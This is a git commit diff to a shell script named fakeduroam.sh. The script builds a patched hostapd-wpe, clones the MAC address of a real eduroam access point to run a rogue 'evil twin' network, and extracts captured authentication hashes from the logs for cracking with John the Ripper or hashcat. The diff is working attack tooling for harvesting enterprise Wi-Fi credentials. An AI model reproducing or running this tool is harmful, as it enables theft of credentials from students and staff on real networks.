442e69cff711efbeb6d28fa7b24bd546b9113e4c
Siren <siren@kernal.eu>
2022-12-09 04:48:19 +0200

    Update hostapd version, fix parsing, add usage string

--- fakeduroam.sh
+++ fakeduroam.sh
@@ -30,7 +30,13 @@ restore() {
 	ip link set "$interface" up
 
 	# Restore suspend on lid close
+	# If you use systemd you shouldn't, or comment out the line below
 	sed -i '/zzz/ s/#//' /etc/acpi/handler.sh
+}
+
+configure() {
+	sed -i -e "/ssid=/s/=.*/=$ssid/" /etc/hostapd-wpe/hostapd-wpe.conf
+	sed -i -e "/interface=/s/=.*/=$interface/" /etc/hostapd-wpe/hostapd-wpe.conf
 }
 
 trap restore INT
@@ -39,11 +45,11 @@ case "$1" in
 	init)
 		# Install and patch hostapd
 		mkdir src && cd src
-		wget https://raw.githubusercontent.com/aircrack-ng/aircrack-ng/master/patches/wpe/hostapd-wpe/hostapd-2.9-wpe.patch
-		wget https://w1.fi/releases/hostapd-2.9.tar.gz
-		tar -zxf hostapd-2.9.tar.gz
-		cd hostapd-2.9
-		patch -p1 < ../hostapd-2.9-wpe.patch
+		wget https://raw.githubusercontent.com/aircrack-ng/aircrack-ng/747618b87825f76b9ccb5026e98930b17a6295f3/patches/wpe/hostapd-wpe/hostapd-2.10-wpe.patch
+		wget https://w1.fi/releases/hostapd-2.10.tar.gz
+		tar -zxf hostapd-2.10.tar.gz
+		cd hostapd-2.10
+		patch -p1 < ../hostapd-2.10-wpe.patch
 		cd hostapd
 		make
 		make install
@@ -54,14 +60,15 @@ case "$1" in
 		./bootstrap
 		make install
 
-		# Modify hostapd-wpe.conf
-		sed -i -e "/ssid=/s/=.*/=$ssid/" /etc/hostapd-wpe/hostapd-wpe.conf
-		sed -i -e "/interface=/s/=.*/=$interface/" /etc/hostapd-wpe/hostapd-wpe.conf
-		echo 'Done!'
+		configure
+		echo 'Done.'
 		;;
 	run)
+		configure
+
 		# Disable suspend on lid close event
-		 sed -i '/zzz/ s/./#&/' /etc/acpi/handler.sh
+		# Comment out if systemd
+		sed -i '/zzz/ s/./#&/' /etc/acpi/handler.sh
 
 		# Set MAC address of the original AP
 		orig_mac=`iwlist "$interface" scan | grep -B 5 "$ssid" | head -n 1 | sed -e 's/.*Address: //'`
@@ -79,10 +86,21 @@ case "$1" in
 		hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
 		;;
 	parse)
+		if [ "$2" != "jtr" ]  && [ "$2" != "hashcat" ]; then
+			echo "Specify a format for parsing: jtr, hashcat."
+			exit
+		fi
 		# Remove duplicates and extract hashes
 		# $2 must be 'jtr' or 'hashcat'
-		grep "$2" $log_dir/hostapd-wpe.log | sed 's/.*\s//' | awk -F: '!a[$1]++' > $log_dir/hashes.txt
+		grep "$2" $log_dir/hostapd-wpe.log | sed 's/.*\s//' | awk -F: '!a[$1]++' | sort > $log_dir/hashes.txt
+		echo "Extracted `wc -l $log_dir/hashes.txt | cut -d' ' -f1` hashes."
 		;;
 	*)
-		echo "Option doesn't exist. Read the script."
+		printf '%s\n' \
+		'Usage: fakeduroam [OPTION]' \
+		'Options:' \
+		'init		Download and patch hostapd.' \
+		'run		Start rouge AP.' \
+		'parse [FORMAT]	Parse collected hashes for cracking. Available formats: jtr, hashcat.'
+		;;
 esac
